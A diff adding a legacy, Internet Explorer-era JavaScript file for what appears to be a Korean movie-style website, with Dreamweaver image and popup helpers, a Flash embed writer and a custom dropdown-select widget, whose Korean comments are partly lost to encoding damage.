@@ -1,0 +1,1284 @@
+/* All 블? */
+function bluring(){
+if(event.srcElement.tagName=="A"||event.srcElement.tagName=="IMG") document.body.focus();
+}
+document.onfocusin=bluring;
+	
+function MM_swapImgRestore() { //v3.0
+  var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
+}
+
+function MM_preloadImages() { //v3.0
+  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
+    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
+    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
+}
+
+function MM_swapImage() { //v3.0
+  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
+   if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
+}
+
+function MM_openBrWindow(theURL,winName,features) { //v2.0
+  window.open(theURL,winName,features);
+}
+function MM_openPrint(theURL,winName,features) { //v2.0
+  window.open(theURL,winName,features);
+} 
+
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+
+function MM_findObj(n, d) { //v4.01
+  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
+    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
+  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
+  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
+  if(!x && d.getElementById) x=d.getElementById(n); return x;
+}
+
+function MM_showHideLayers() { //v6.0
+  var i,p,v,obj,args=MM_showHideLayers.arguments;
+  for (i=0; i<(args.length-2); i+=3) if ((obj=MM_findObj(args[i]))!=null) { v=args[i+2];
+    if (obj.style) { obj=obj.style; v=(v=='show')?'visible':(v=='hide')?'hidden':v; }
+    obj.visibility=v; }
+}
+
+
+
+
+	
+// 점??뉴 ?창?로 ?리기
+function sg_new_win(str_url){
+	if(str_url!=""){
+		window.open(str_url);
+	}
+}
+
+// 플?? 점선 ?애기
+	function flash_contents(file,width,height){
+		document.writeln("<OBJECT classid='clsid:D27CDB6E-AE6D-11cf-96B8-444553540000' codebase='http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,0,0' WIDTH='"+width+"' HEIGHT='"+height+"' id='contents' ALIGN=''>");
+		document.writeln("<PARAM NAME=movie value='"+file+"' />");
+		document.writeln("<PARAM NAME=quality VALUE=high>");
+		document.writeln("<PARAM NAME=bgcolor VALUE=#FFFFFF>");
+		document.writeln("<PARAM NAME=wmode VALUE=transparent> ");
+		document.writeln("<embed src='"+file+"' quality='high' bgcolor='#FFFFFF' width='"+width+"' height='"+height+"' name='contents' align='middle' allowScriptAccess='sameDomain' type='application/x-shockwave-flash' pluginspage='http://www.macromedia.com/go/getflashplayer' />");
+		document.writeln("</OBJECT>");
+	}
+
+//  플???뉴??	
+function link(x){
+	var check = x;
+		if(check==1) {
+			window.open('/open/2007/ecampus/start.asp','','width=961,height=749');
+		}
+		if(check==2) {
+			window.open('/open/2007/publicity/tv.asp','','width=640,height=480');
+		}
+	}
+
+/* ??? 넣기 */
+document.title=" ON MOVIE STYLE "	
+
+
+
+/* select */
+// SaySelect Environment Constants
+
+var SS_ENV = new Object();
+SS_ENV.IE_Version = new Number(((window.navigator.appVersion.split('; '))[1].split(' '))[1]);
+SS_ENV.CR = new Object();
+
+SS_ENV.CR.ReverseBackground = '#112237';
+SS_ENV.CR.ReverseText = '#A8B1BE';
+SS_ENV.CR.Border = '#374153';
+SS_ENV.CR.BorderActive = '#374153';
+SS_ENV.ImgPrefix = '';
+SS_ENV.DefaultHeight =15;
+SS_ENV.ButtonWidth = 16;
+SS_ENV.OptionsDivStyle = ''
+  + ' display:none;'
+  + ' z-index:10;'
+  + ' position:absolute;'
+  + ' border:1 solid '+ SS_ENV.CR.Border+';'
+  + ' background-color:#1C1F26;'
+  + ' scrollbar-face-color:#DEDEDE;'
+  + ' scrollbar-shadow-color:DEDEDE;'
+  + ' scrollbar-highlight-color:#DEDEDE;'
+  + ' scrollbar-3dlight-color:DEDEDE;'
+  + ' scrollbar-darkshadow-color:#F5F5F5;'
+  + ' scrollbar-track-color:#F5F5F5;'
+  + ' scrollbar-arrow-color:#B3B3B3;';
+SS_ENV.MouseStyle = 'cursor:hand;'//박?위에?라갔??의 마우?모?
+SS_ENV.OptionNobrStyle = ''
+  + ' font-size:8pt; padding-bottom:2;padding-left:3px;'
+  + ' font-family:돋?; color:#A8B1BE; ';
+  
+/*
+SS_ENV.CR.ReverseBackground = '';
+SS_ENV.CR.ReverseText = '#A8B1BE';
+SS_ENV.CR.Border = '';
+SS_ENV.CR.BorderActive = '';
+SS_ENV.ImgPrefix = '';
+SS_ENV.DefaultHeight =15;
+SS_ENV.ButtonWidth = 16;
+SS_ENV.OptionsDivStyle = ''
+  + ' display:none;'
+  + ' z-index:10;'
+  + ' position:absolute;'
+  + ' border:0 solid '+ SS_ENV.CR.Border+';'
+  + ' background-color:#1C1F26;'
+  + ' scrollbar-face-color:#DEDEDE;'
+  + ' scrollbar-shadow-color:DEDEDE;'
+  + ' scrollbar-highlight-color:#DEDEDE;'
+  + ' scrollbar-3dlight-color:DEDEDE;'
+  + ' scrollbar-darkshadow-color:#F5F5F5;'
+  + ' scrollbar-track-color:#F5F5F5;'
+  + ' scrollbar-arrow-color:#B3B3B3;';
+SS_ENV.MouseStyle = 'cursor:hand;'//박?위에?라갔??의 마우?모?
+SS_ENV.OptionNobrStyle = ''
+  + ' font-size:9pt; padding-bottom:2'
+  + ' font-family:돋?;'; */
+// SaySelect Variables
+var SS_VAR = new Object();
+SS_VAR.DivDummy = document.createElement("DIV");
+SS_VAR.SelectList = new Array();
+SS_VAR.bEventAttached = false;
+
+var SS_CreatedElements = new Object();
+
+function unloadObjects()
+{
+  try {
+    if (SS_VAR && SS_VAR.SelectList)
+    {
+      for (key in SS_VAR.SelectList)
+      {
+	if (SS_VAR.SelectList[key])
+	{
+	  try {
+	   SS_VAR.SelectList[key].select.setAttribute('SS', 0);
+	  } catch (e) {};
+	  delete SS_VAR.SelectList[key];
+	}
+      }
+    }
+  } catch (e) {};
+}
+
+attachEvent("onunload", unloadObjects);
+
+function SS_create (srcHTML, ListMax, bAutoDetect)
+{
+  // property
+  this.ssID = SS_VAR.SelectList.length;
+  this.bOriginalSelect = (bAutoDetect && SS_ENV.IE_Version < 5.5);
+  this.select = SS_createElement(srcHTML);
+  this.selectedIndex = this.select.selectedIndex;
+  this.options = this.select.options;
+  this.width = parseInt(this.select.style.width);
+  this.height = (this.select.style.height) ? parseInt(this.select.style.height) : SS_ENV.DefaultHeight;
+  this.OptionHeight = this.height ;
+  this.bListDown = (ListMax && '-'==ListMax.toString().substr(0, 1)) ? false : true;
+  this.ListMax = (!isNaN(parseInt(ListMax))) ? Math.abs(ListMax) : 100;
+
+  this.Table;
+  this.TitleDiv;
+  this.TitleTable;
+  this.TitleWrapper;
+  this.OptionsDiv;
+  this.OptionsWrapper;
+  this.OptionsTable;
+  this.bFocused = false;
+  this.bExpanded = false;
+  this.bReverse = false;
+
+  // private method
+  this.isThisEventToBeCanceled = SS_isThisEventToBeCanceled;
+  this.toggleTitle = SS_toggleTitle;
+  this.syncSelectedIndex = SS_syncSelectedIndex;
+  this.toggleOptions = SS_toggleOptions;
+  this.turnOnOption = SS_turnOnOption;
+  this.turnOffOption = SS_turnOffOption;
+  this.handleMousewheel = SS_handleMousewheel;
+  this.handleOverTitle = SS_handleOverTitle;
+  this.handleOutTitle = SS_handleOutTitle;
+  this.handleOverOption = SS_handleOverOption;
+  this.createTable = SS_createTable;
+  this.createTitleDiv = SS_createTitleDiv;
+  this.createOptionsDiv = SS_createOptionsDiv;
+  this.createOptionTr = SS_createOptionTr;
+  this.adjustOptionsDiv = SS_adjustOptionsDiv;
+  this.syncOptions = SS_syncOptions;
+  this.pressOption = SS_pressOption;
+  this.moveOption = SS_moveOption;
+  this.releaseOption = SS_releaseOption;
+  this.pressTitle = SS_pressTitle;
+  this.releaseTitle = SS_releaseTitle;
+
+  // public method
+  this.display = SS_display;
+  this.insertOption = SS_insertOption;
+  this.deleteOption = SS_deleteOption;
+  this.changeOption = SS_changeOption;
+
+  // initiate
+  this.createTable();
+  this.select.setAttribute('SS', this);
+  if (!this.bOriginalSelect)
+    this.select.onpropertychange = SS_handlePropertychange;
+  SS_VAR.SelectList[this.ssID] = this;
+}
+function SS_display ()
+{
+  document.write("<div id=SS_TempDiv></div>\n");
+  document.all.SS_TempDiv.appendChild(this.Table);
+  document.all.SS_TempDiv.removeNode();
+}
+function SS_write (srcHTML, ListMax, bAutoDetect)
+{
+  var oSS = new SS_create(srcHTML, ListMax, bAutoDetect);
+  oSS.display();
+  return oSS;
+}
+function SS_insertOption (value, innerText, idx)
+{
+  var NewOption = document.createElement("OPTION");
+  SS_CreatedElements[SS_CreatedElements.length] = NewOption;
+  this.options.add(NewOption, idx);
+  NewOption.innerText = innerText;
+  NewOption.value = value;
+
+  if (!this.bOriginalSelect)
+    this.createOptionTr(idx);
+  this.syncOptions();
+  this.adjustOptionsDiv();
+  this.syncSelectedIndex();
+}
+function SS_deleteOption (idx)
+{
+  this.options.remove(idx);
+  if (!this.bOriginalSelect)
+    this.OptionsTable.deleteRow(idx);
+  this.syncOptions();
+  this.adjustOptionsDiv();
+  this.syncSelectedIndex();
+}
+function SS_changeOption (idx, value, innerText)
+{
+  this.options[idx].value = value;
+  this.options[idx].innerText = innerText;
+  this.syncOptions();
+  this.syncSelectedIndex();
+}
+
+function SS_insertOption1 (obj, value, innerText, idx)
+{
+  var NewOption = document.createElement("OPTION");
+  SS_CreatedElements[SS_CreatedElements.length] = NewOption;
+  obj.options.add(NewOption, idx);
+  NewOption.innerText = innerText;
+  NewOption.value = value;
+
+  if (!obj.bOriginalSelect)
+    obj.createOptionTr(idx);
+
+  obj.syncOptions();
+  obj.adjustOptionsDiv();
+  obj.syncSelectedIndex();
+}
+
+
+function SS_changeOption1 (obj, idx, value, innerText)
+{
+  obj.options[idx].value = value;
+  obj.options[idx].innerText = innerText;
+  obj.syncOptions();
+  obj.syncSelectedIndex();
+}
+
+function SS_deleteOption1 (obj, idx)
+{
+  obj.options.remove(idx);
+  if (!obj.bOriginalSelect)
+    obj.OptionsTable.deleteRow(idx);
+  obj.syncOptions();
+  obj.adjustOptionsDiv();
+  obj.syncSelectedIndex();
+}
+
+
+function SS_cancelEvent (event)
+{
+  event.cancelBubble = true;
+  event.returnValue = false;
+}
+function SS_isThisEventToBeCanceled (event)
+{
+  if ('object' == typeof(event)) {
+    switch (event.type) {
+      case 'mousedown':
+        if (!(event.button & 1)) return true;
+        break;
+      case 'mouseup':
+        if (!(event.button & 1)) return true;
+        if (SS_ENV.IE_Version >= 5.5 && event.srcElement != this.srcElementOfLastMousedown && this.srcElementOfLastMousedown != null) {
+          this.srcElementOfLastMousedown = null;
+          return true;
+        }
+        break;
+      case 'mouseout':
+        if (!(SS_ENV.IE_Version < 5.5 && event.srcElement == this.srcElementOfLastMousedown))
+          return true;
+        break;
+      case 'mousemove':
+        if (SS_ENV.IE_Version >= 5.5 && event.srcElement != this.srcElementOfLastMousedown && this.srcElementOfLastMousedown != null)
+          return true;
+        break;
+    }
+  }
+  return false;
+}
+function SS_createElement (html)
+{
+  SS_VAR.DivDummy.insertAdjacentHTML('afterBegin', html);
+  var oEl = SS_VAR.DivDummy.children(0);
+  while (SS_VAR.DivDummy.children.length > 0) {
+    SS_VAR.DivDummy.removeChild(SS_VAR.DivDummy.children(0));
+  }
+  return oEl;
+}
+function SS_blurExcept (except)
+{
+  SS_cancelEvent(window.event);
+
+  except = ('number'==typeof(except)) ? except : -1;
+
+  var bHasToDetachEvent = true;
+  for (var i=0; i < SS_VAR.SelectList.length; i++) {
+    if (-1==except && SS_VAR.SelectList[i].bFocused && SS_VAR.SelectList[i].bExpanded) {
+      SS_VAR.SelectList[i].toggleOptions(false, true);
+      SS_VAR.SelectList[i].toggleTitle(true);
+      bHasToDetachEvent = false;
+    }
+    else if (i!=except) {
+      if (SS_VAR.SelectList[i].bExpanded)
+        SS_VAR.SelectList[i].toggleOptions(false, true);
+      if (SS_VAR.SelectList[i].bReverse)
+        SS_VAR.SelectList[i].toggleTitle(false);
+      SS_VAR.SelectList[i].bFocused = false;
+    }
+  }
+
+  if (SS_VAR.bEventAttached && bHasToDetachEvent) {
+    document.detachEvent('onmousedown', SS_blurExcept);
+    document.detachEvent('ondblclick', SS_blurExcept);
+    SS_VAR.bEventAttached = false;
+  }
+}
+function SS_syncSelectedIndex ()
+{
+  this.selectedIndex = this.select.selectedIndex;
+
+  if (this.bOriginalSelect) return;
+
+  if (this.TitleTable.cells(0).childNodes(0).innerText != this.options[this.selectedIndex].innerText)
+    this.TitleTable.cells(0).childNodes(0).innerText = this.options[this.selectedIndex].innerText;
+  if (this.bExpanded)
+    this.toggleOptions(false);
+}
+function SS_syncSelectedIndex1 (obj)
+{
+  obj.selectedIndex = obj.select.selectedIndex;
+
+  if (obj.bOriginalSelect) return;
+
+  if (obj.TitleTable.cells(0).childNodes(0).innerText != obj.options[obj.selectedIndex].innerText)
+    obj.TitleTable.cells(0).childNodes(0).innerText = obj.options[obj.selectedIndex].innerText;
+  if (obj.bExpanded)
+    obj.toggleOptions(false);
+}
+function SS_toggleTitle (bReverse)
+{
+  this.bReverse = ('undefined'!=typeof(bReverse)) ? bReverse: (!this.bReverse);
+  this.TitleTable.cells(0).style.backgroundColor = this.bReverse ? SS_ENV.CR.ReverseBackground : '';
+  this.TitleTable.cells(0).style.color = this.bReverse ? SS_ENV.CR.ReverseText : '';
+}
+function SS_toggleOptions (bExpanded, bStrict)
+{
+  if (!bStrict && !this.bFocused) {
+    SS_blurExcept(this.ssID);
+  }
+  this.bExpanded = ('undefined'!=typeof(bExpanded)) ? bExpanded: (!this.bExpanded);
+  if (this.bExpanded) {
+    this.adjustOptionsDiv();
+    this.OptionsDiv.style.display = 'block';
+    if (!bStrict) {
+      this.toggleTitle(false);
+      this.handleOverOption(this.selectedIndex);
+    }
+    this.handleOutTitle();
+  }
+  else {
+    this.OptionsDiv.style.display = 'none';
+    if (!bStrict) {
+      this.toggleTitle(true);
+    }
+  }
+  if (!bStrict) {
+    this.bFocused = true;
+
+    if (!SS_VAR.bEventAttached) {
+      document.attachEvent('onmousedown', SS_blurExcept);
+      document.attachEvent('ondblclick', SS_blurExcept);
+      SS_VAR.bEventAttached = true;
+    }
+  }
+}
+function SS_handlePropertychange ()
+{
+  if ('propertychange'==window.event.type && 'selectedIndex'==window.event.propertyName) {
+    var oSS = window.event.srcElement.SS;
+    oSS.syncSelectedIndex();
+
+    if (null != oSS.select.onchange)
+      oSS.select.onchange();
+  }
+}
+function SS_handleMousewheel (event)
+{
+  var idx = this.selectedIndex;
+  if ('mousewheel'==event.type && this.bFocused && this.bReverse) {
+    for (var i=0; i < event.wheelDelta; i += 120)
+      idx--;
+    for (var i=0; i > event.wheelDelta; i -= 120)
+      idx++;
+  }
+  idx = Math.max(idx, 0);
+  idx = Math.min(idx, this.options.length - 1);
+  this.select.selectedIndex = idx;
+}
+function SS_handleOverTitle ()
+{
+  if (this.bExpanded)
+    return;
+
+  this.TitleTable.style.borderColor = SS_ENV.CR.BorderActive;
+  this.TitleTable.cells(1).style.display = 'none';
+  this.TitleTable.cells(2).style.display = 'block';
+}
+function SS_handleOutTitle ()
+{
+  this.TitleTable.style.borderColor = SS_ENV.CR.Border;
+  this.TitleTable.cells(2).style.display = 'none';
+  this.TitleTable.cells(1).style.display = 'block';
+}
+function SS_handleOverOption (idx)
+{
+  for (var i=0; i < this.options.length; i++) {
+    if (i==idx)
+      this.turnOnOption(i);
+    else
+      this.turnOffOption(i);
+  }
+}
+function SS_turnOnOption (idx)
+{
+  this.OptionsTable.cells(idx).style.color = SS_ENV.CR.ReverseText;
+  this.OptionsTable.cells(idx).style.backgroundColor = SS_ENV.CR.ReverseBackground;
+}
+function SS_turnOffOption (idx)
+{
+  this.OptionsTable.cells(idx).style.color = '';
+  this.OptionsTable.cells(idx).style.backgroundColor = '';
+}
+function SS_adjustOptionsDiv ()
+{
+  if (this.bOriginalSelect) return;
+
+  this.OptionsDiv.style.width = this.width;
+  this.OptionsDiv.style.height = Math.min(this.options.length, this.ListMax) * this.OptionHeight ;
+  this.OptionsWrapper.style.height = this.options.length * this.OptionHeight;
+  this.OptionsDiv.style.overflowY = (this.options.length > this.ListMax) ? 'scroll' : '';
+
+  var top = this.Table.offsetTop;
+  var left = this.Table.offsetLeft;
+  for (var El = this.Table.offsetParent; 'BODY'!=El.tagName && 'absolute'!=El.style.position && 'relative'!=El.style.position; El = El.offsetParent) {
+    if ('TABLE' != El.tagName) {
+      top += El.clientTop;
+      left += El.clientLeft;
+    }
+    top += El.offsetTop;
+    left += El.offsetLeft;
+  }
+  this.OptionsDiv.style.top = (this.bListDown) ? (top + this.height) : (top - parseInt(this.OptionsDiv.style.height));
+  this.OptionsDiv.style.left = left;
+
+  this.TitleWrapper.style.top = 0;
+  this.TitleWrapper.style.left = 0;
+}
+function SS_syncOptions ()
+{
+  if (this.bOriginalSelect) return;
+
+  for (var i=0; i < this.options.length; i++) {
+    this.OptionsTable.cells(i).setAttribute('index', i);
+    if (this.OptionsTable.cells(i).childNodes(0).innerText != this.options[i].innerText)
+      this.OptionsTable.cells(i).childNodes(0).innerText = this.options[i].innerText;
+  }
+}
+function SS_pressTitle (event)
+{
+  SS_cancelEvent(event);
+
+  this.srcElementOfLastMousedown = event.srcElement;
+
+  this.toggleOptions();
+}
+function SS_releaseTitle (event)
+{
+  SS_cancelEvent(event);
+
+  if (this.isThisEventToBeCanceled(event)) return;
+
+  this.srcElementOfLastMousedown = null;
+}
+function SS_pressOption (event)
+{
+  SS_cancelEvent(event);
+
+  this.srcElementOfLastMousedown = event.srcElement;
+}
+function SS_moveOption (event)
+{
+  SS_cancelEvent(event);
+
+  if (this.isThisEventToBeCanceled(event)) return;
+  if (!(event.offsetX >= 0 && event.offsetX <= this.OptionsTable.offsetWidth)) return;
+
+  this.handleOverOption(Math.floor(event.offsetY / this.OptionHeight));
+}
+function SS_releaseOption (event)
+{
+  SS_cancelEvent(event);
+
+  if (this.isThisEventToBeCanceled(event)) return;
+
+  this.srcElementOfLastMousedown = null;
+
+  if (event.offsetX >= 0 && event.offsetX <= this.OptionsTable.offsetWidth) {
+    this.toggleOptions(false);
+    this.select.selectedIndex = Math.floor(event.offsetY / this.OptionHeight);
+  }
+}
+function SS_createTable ()
+{
+  this.Table = SS_createElement(""
+    + "<table border=0 cellpadding=0 cellspacing=0 style='table-layout:fixed; "+SS_ENV.MouseStyle+"'>"
+    + "<tr><td></td></tr>"
+    + "</table>"
+  );
+  if (!isNaN(this.width))
+    this.Table.style.width = this.width;
+  this.Table.style.height = this.height;
+
+  if (!this.bOriginalSelect) {
+    this.createTitleDiv();
+    this.createOptionsDiv();
+    this.Table.cells(0).appendChild(this.TitleDiv);
+    this.Table.cells(0).appendChild(this.OptionsDiv);
+  }
+  else {
+    this.Table.cells(0).appendChild(this.select);
+  }
+}
+function SS_createTitleDiv ()
+{
+  this.TitleDiv = SS_createElement(""
+    + "<div style='position:relative; top:0; left:0;'>"
+    + "  <table border=0 cellpadding=0 cellspacing=0"
+    + "    height="+this.height
+    + "    bgcolor=1C1F26"
+    + "    style='table-layout:fixed; border:1 solid "+SS_ENV.CR.Border+";'"
+    + "    onmouseover='SS_VAR.SelectList["+this.ssID+"].adjustOptionsDiv()'"
+    + "  >"
+    + "  <tr>"
+    + "    <td><nobr style='text-oveflow:hidden;"+SS_ENV.OptionNobrStyle+"'></nobr></td>"
+    + "    <td width="+SS_ENV.ButtonWidth+" align=center style='word-wrap:normal'></td>"
+    + "    <td style='display:none' width="+SS_ENV.ButtonWidth+" align=center style='word-wrap:normal'></td>"
+    + "    <td style='display:none'></td>"
+    + "  </tr>"
+    + "  </table>"
+    + "</div>"
+  );
+  this.TitleTable = this.TitleDiv.childNodes(0);
+  this.TitleTable.cells(0).childNodes(0).innerText = this.options[this.selectedIndex].innerText;
+  this.TitleTable.cells(1).innerHTML = "<img src='/images/sub/top/btn_arrow.gif' border=0 align=absmiddle>";
+  this.TitleTable.cells(2).innerHTML = "<img src='/images/sub/top/btn_arrow.gif' border=0 align=absmiddle>";
+  this.TitleTable.cells(3).appendChild(this.select);
+  this.TitleWrapper = document.createElement(""
+    + "<img src='"+SS_ENV.ImgPrefix+"/images/sub/top/blank.gif'"
+    + "  style='position:absolute; top:0; left:0; z-index:2; width:100%; height:"+this.height+";'"
+    + "  onmouseover='SS_VAR.SelectList["+this.ssID+"].handleOverTitle()'"
+    + "  onmouseout='SS_VAR.SelectList["+this.ssID+"].handleOutTitle(); SS_VAR.SelectList["+this.ssID+"].releaseTitle(window.event);'"
+    + "  onmousedown='SS_VAR.SelectList["+this.ssID+"].pressTitle(window.event)'"
+    + "  ondblclick='SS_VAR.SelectList["+this.ssID+"].pressTitle(window.event); SS_VAR.SelectList["+this.ssID+"].releaseTitle(window.event);'"
+    + "  onmouseup='SS_VAR.SelectList["+this.ssID+"].releaseTitle(window.event)'"
+    + "  onmousewheel='SS_VAR.SelectList["+this.ssID+"].handleMousewheel(window.event)'"
+    + "  ondragstart='SS_cancelEvent(window.event)'"
+    + ">"
+  );
+  SS_CreatedElements[SS_CreatedElements.length] = this.TitleWrapper;
+  this.TitleDiv.appendChild(this.TitleWrapper);
+}
+function SS_createOptionsDiv ()
+{
+  this.OptionsDiv = SS_createElement(""
+    + "<div style='"+SS_ENV.OptionsDivStyle+"'"
+    + "  onscroll='SS_VAR.SelectList["+this.ssID+"].moveOption(window.event)'"
+    + "  onmousedown='SS_cancelEvent(window.event)'"
+    + ">"
+    + "  <table border=0 cellpadding=3 cellspacing=0 width=100% style='table-layout:fixed'>"
+    + "  </table>"
+    + "</div>"
+  );
+  this.OptionsTable = this.OptionsDiv.childNodes(0);
+  for (var i=0; i < this.options.length; i++) {
+    this.createOptionTr(i);
+  }
+  this.syncOptions();
+  this.OptionsWrapper = document.createElement(""
+	+ "<img src='"+SS_ENV.ImgPrefix+"/images/sub/top/blank2.gif'"
+    + "  style='position:absolute; top:0; left:0; width:100%;'"
+    + "  onmousedown='SS_VAR.SelectList["+this.ssID+"].pressOption(window.event)'"
+    + "  onmousemove='SS_VAR.SelectList["+this.ssID+"].moveOption(window.event)'"
+    + "  onmouseup='SS_VAR.SelectList["+this.ssID+"].releaseOption(window.event)'"
+    + "  onmouseout='SS_VAR.SelectList["+this.ssID+"].releaseOption(window.event)'"
+    + "  ondragstart='SS_cancelEvent(window.event)'"
+    + ">"
+  );
+  SS_CreatedElements[SS_CreatedElements.length] = this.OptionsWrapper;
+  this.OptionsDiv.appendChild(this.OptionsWrapper);
+}
+function SS_createOptionTr (idx)
+{
+  idx = ('undefined'!=typeof(idx)) ? idx : this.options.length - 1;
+  var OptionTr = this.OptionsTable.insertRow(-1);
+  var OptionTd = document.createElement("<td height="+this.OptionHeight+"></td>");
+  SS_CreatedElements[SS_CreatedElements.length] = this.OptionsTd;
+  OptionTd.appendChild(document.createElement("<nobr style='"+SS_ENV.OptionNobrStyle+"'></nobr>"));
+  OptionTr.appendChild(OptionTd);
+}
+
+
+
+function sectionChange(form)
+{
+	var idx_office = SS_office.selectedIndex;
+	var office_section = section_list[idx_office];
+	var tmp, i, len;
+
+	len = SS_section.options.length;
+
+	for (i = office_section.length - 1; i >= 0; i--) {
+		tmp = office_section[i].split(",");
+		SS_section.insertOption(tmp[1], tmp[0], 0);
+	}
+
+	offset = office_section.length;
+	for (i = office_section.length; i < office_section.length + len; i++) {
+		SS_section.deleteOption(offset);
+	}
+}
+/* select style end */
+	
+	
+	
+/* select style footer */
+
+// SaySelect Environment Constants
+
+var FOO_ENV = new Object();
+FOO_ENV.IE_Version = new Number(((window.navigator.appVersion.split('; '))[1].split(' '))[1]);
+FOO_ENV.CR = new Object();
+
+FOO_ENV.CR.ReverseBackground = '#01597B';
+FOO_ENV.CR.ReverseText = '#000000';
+FOO_ENV.CR.Border = '#0E1A26';
+FOO_ENV.CR.BorderActive = '#0E1A26';
+FOO_ENV.ImgPrefix = '';
+FOO_ENV.DefaultHeight =18;
+FOO_ENV.ButtonWidth = 16;
+FOO_ENV.OptionsDivStyle = ''
+  + ' display:none;'
+  + ' z-index:10;'
+  + ' position:absolute;'
+  + ' border:0 solid '+ FOO_ENV.CR.Border+';'
+  + ' background-color:#00445F;'
+  + ' scrollbar-face-color:#DEDEDE;'
+  + ' scrollbar-shadow-color:DEDEDE;'
+  + ' scrollbar-highlight-color:#DEDEDE;'
+  + ' scrollbar-3dlight-color:DEDEDE;'
+  + ' scrollbar-darkshadow-color:#F5F5F5;'
+  + ' scrollbar-track-color:#F5F5F5;'
+  + ' scrollbar-arrow-color:#B3B3B3;';
+FOO_ENV.MouseStyle = 'cursor:hand;'//박?위에?라갔??의 마우?모?
+FOO_ENV.OptionNobrStyle = ''
+  + ' font-size:9pt; padding:2 0 0 5'
+  + ' font-family:돋?;  FONT-WEIGHT:BOLD; color:#000000; align:center';
+
+var FOO_VAR = new Object();
+FOO_VAR.DivDummy = document.createElement("DIV");
+FOO_VAR.SelectList = new Array();
+FOO_VAR.bEventAttached = false;
+
+var FOO_CreatedElements = new Object();
+
+function unloadObjects()
+{
+  try {
+    if (FOO_VAR && FOO_VAR.SelectList)
+    {
+      for (key in FOO_VAR.SelectList)
+      {
+	if (FOO_VAR.SelectList[key])
+	{
+	  try {
+	   FOO_VAR.SelectList[key].select.setAttribute('SS', 0);
+	  } catch (e) {};
+	  delete FOO_VAR.SelectList[key];
+	}
+      }
+    }
+  } catch (e) {};
+}
+
+attachEvent("onunload", unloadObjects);
+
+function FOO_create (srcHTML, ListMax, bAutoDetect)
+{
+  // property
+  this.ssID = FOO_VAR.SelectList.length;
+  this.bOriginalSelect = (bAutoDetect && FOO_ENV.IE_Version < 5.5);
+  this.select = FOO_createElement(srcHTML);
+  this.selectedIndex = this.select.selectedIndex;
+  this.options = this.select.options;
+  this.width = parseInt(this.select.style.width);
+  this.height = (this.select.style.height) ? parseInt(this.select.style.height) : FOO_ENV.DefaultHeight;
+  this.OptionHeight = this.height ;
+  this.bListDown = (ListMax && '-'==ListMax.toString().substr(0, 1)) ? false : true;
+  this.ListMax = (!isNaN(parseInt(ListMax))) ? Math.abs(ListMax) : 100;
+
+  this.Table;
+  this.TitleDiv;
+  this.TitleTable;
+  this.TitleWrapper;
+  this.OptionsDiv;
+  this.OptionsWrapper;
+  this.OptionsTable;
+  this.bFocused = false;
+  this.bExpanded = false;
+  this.bReverse = false;
+
+  // private method
+  this.isThisEventToBeCanceled = FOO_isThisEventToBeCanceled;
+  this.toggleTitle = FOO_toggleTitle;
+  this.syncSelectedIndex = FOO_syncSelectedIndex;
+  this.toggleOptions = FOO_toggleOptions;
+  this.turnOnOption = FOO_turnOnOption;
+  this.turnOffOption = FOO_turnOffOption;
+  this.handleMousewheel = FOO_handleMousewheel;
+  this.handleOverTitle = FOO_handleOverTitle;
+  this.handleOutTitle = FOO_handleOutTitle;
+  this.handleOverOption = FOO_handleOverOption;
+  this.createTable = FOO_createTable;
+  this.createTitleDiv = FOO_createTitleDiv;
+  this.createOptionsDiv = FOO_createOptionsDiv;
+  this.createOptionTr = FOO_createOptionTr;
+  this.adjustOptionsDiv = FOO_adjustOptionsDiv;
+  this.syncOptions = FOO_syncOptions;
+  this.pressOption = FOO_pressOption;
+  this.moveOption = FOO_moveOption;
+  this.releaseOption = FOO_releaseOption;
+  this.pressTitle = FOO_pressTitle;
+  this.releaseTitle = FOO_releaseTitle;
+
+  // public method
+  this.display = FOO_display;
+  this.insertOption = FOO_insertOption;
+  this.deleteOption = FOO_deleteOption;
+  this.changeOption = FOO_changeOption;
+
+  // initiate
+  this.createTable();
+  this.select.setAttribute('SS', this);
+  if (!this.bOriginalSelect)
+    this.select.onpropertychange = FOO_handlePropertychange;
+  FOO_VAR.SelectList[this.ssID] = this;
+}
+function FOO_display ()
+{
+  document.write("<div id=FOO_TempDiv></div>\n");
+  document.all.FOO_TempDiv.appendChild(this.Table);
+  document.all.FOO_TempDiv.removeNode();
+}
+function FOO_write (srcHTML, ListMax, bAutoDetect)
+{
+  var oSS = new FOO_create(srcHTML, ListMax, bAutoDetect);
+  oSS.display();
+  return oSS;
+}
+function FOO_insertOption (value, innerText, idx)
+{
+  var NewOption = document.createElement("OPTION");
+  FOO_CreatedElements[FOO_CreatedElements.length] = NewOption;
+  this.options.add(NewOption, idx);
+  NewOption.innerText = innerText;
+  NewOption.value = value;
+
+  if (!this.bOriginalSelect)
+    this.createOptionTr(idx);
+  this.syncOptions();
+  this.adjustOptionsDiv();
+  this.syncSelectedIndex();
+}
+function FOO_deleteOption (idx)
+{
+  this.options.remove(idx);
+  if (!this.bOriginalSelect)
+    this.OptionsTable.deleteRow(idx);
+  this.syncOptions();
+  this.adjustOptionsDiv();
+  this.syncSelectedIndex();
+}
+function FOO_changeOption (idx, value, innerText)
+{
+  this.options[idx].value = value;
+  this.options[idx].innerText = innerText;
+  this.syncOptions();
+  this.syncSelectedIndex();
